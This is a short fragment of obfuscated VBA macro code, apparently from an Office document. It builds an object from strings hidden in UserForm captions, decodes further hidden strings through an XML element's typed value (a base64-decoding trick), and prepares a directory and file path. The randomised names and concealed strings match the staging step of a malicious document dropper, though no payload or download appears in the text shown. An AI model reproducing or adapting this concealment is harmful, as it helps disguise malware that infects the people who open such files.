    Dim HLVIQBH, VSKQDNQ

    Set HLVIQBH = CreateObject(IFUZYDTTOP.nPuyGkKr.Caption & IFUZYDTTOP.jpqKCxUd.Caption)
    Set VSKQDNQ = HLVIQBH.CreateElement(IFUZYDTTOP.QevjtDZF.Caption)
    
    VSKQDNQ.DataType = IFUZYDTTOP.MgQnQVGb.Caption
    VSKQDNQ.Text = IFUZYDTTOP.iuiITrLG.Caption
    TVVOXTO = VSKQDNQ.nodeTypedValue
    
    Dim SADSTPE As String
    Dim CJKFFKS As String
    
    VSKQDNQ.Text = IFUZYDTTOP.hMcZvwhq.Caption
    SADSTPE = VSKQDNQ.nodeTypedValue
    
    VSKQDNQ.Text = IFUZYDTTOP.DDFyQLPa.Caption
    CJKFFKS = VSKQDNQ.nodeTypedValue
    
    If Dir(SADSTPE, vbDirectory) = "" Then
       Call UHIBPKDL(SADSTPE)
    Else
    End If
    
    If Dir(SADSTPE & CJKFFKS) = "" Then

    Else
    End If
    
    Set HLVIQBH = Nothing
    Set VSKQDNQ = Nothing
